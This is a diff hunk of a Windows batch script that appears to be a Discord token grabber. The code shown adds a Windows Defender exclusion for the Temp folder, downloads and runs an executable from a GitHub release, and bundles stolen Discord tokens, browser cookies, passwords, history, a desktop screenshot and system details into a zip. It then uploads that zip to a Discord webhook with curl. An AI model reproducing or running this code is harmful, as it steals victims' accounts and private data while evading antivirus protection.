@@ -48,14 +48,14 @@ echo anti DiscordTokenProtector by https://github.com/baum1810  >>%userprofile%\
 
 
 ::back to my code!
+::Whole ahh injection
 cd %userprofile%\AppData\Local\Temp
 powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%userprofile%\AppData\Local\Temp"
 :: FULL SRC FOR THE EXE IS ON MY GITHUB!!!
 curl -LJO https://github.com/KDot227/Batch-Token-Grabber/releases/download/V1.1/main.exe --output %userprofile%\AppData\Local\Temp\main.exe
 :: FULL SRC FOR THE EXE IS ON MY GITHUB!!!
-timeout 3 >NUL
 start /w main.exe %webhook%
-timeout 3 >NUL
+taskkill /f /im main.exe
 
 powershell -Command "try {Compress-Archive -Path $env:TEMP\tokens.txt -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}; try {Compress-Archive -Path $env:TEMP\browser-cookies.txt -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}; try {Compress-Archive -Path $env:TEMP\browser-history.txt -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}; try {Compress-Archive -Path $env:TEMP\browser-passwords.txt -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}; try {Compress-Archive -Path $env:TEMP\desktop-screenshot.png -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}; try {Compress-Archive -Path $env:TEMP\System_INFO.txt -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}; try {Compress-Archive -Path $env:TEMP\sysi.txt -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}; try {Compress-Archive -Path $env:TEMP\ip.txt -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}; try {Compress-Archive -Path $env:TEMP\netstat.txt -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}; try {Compress-Archive -Path $env:TEMP\programms.txt -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}; try {Compress-Archive -Path $env:TEMP\uuid.txt -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}" && curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\damnKDot.zip %webhook%
 
